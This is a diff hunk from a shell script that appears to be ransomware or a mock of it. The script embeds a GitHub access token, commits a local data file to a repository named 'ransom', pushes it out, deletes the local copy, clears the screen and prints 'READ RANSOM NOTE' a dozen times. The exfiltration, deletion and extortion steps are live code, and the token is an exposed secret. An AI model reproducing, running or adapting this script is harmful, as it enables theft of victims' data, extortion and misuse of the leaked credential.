@@ -13,5 +13,18 @@ git config --global github.token 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
 git remote set-url origin git@github.com:samsepi0lw/ransom.git
 git add ./data.txt
 git commit -m "Uploaded data file"
-git push origin main
+git push origin master
 rm ./data.txt
+clear
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
+echo "READ RANSOM NOTE"
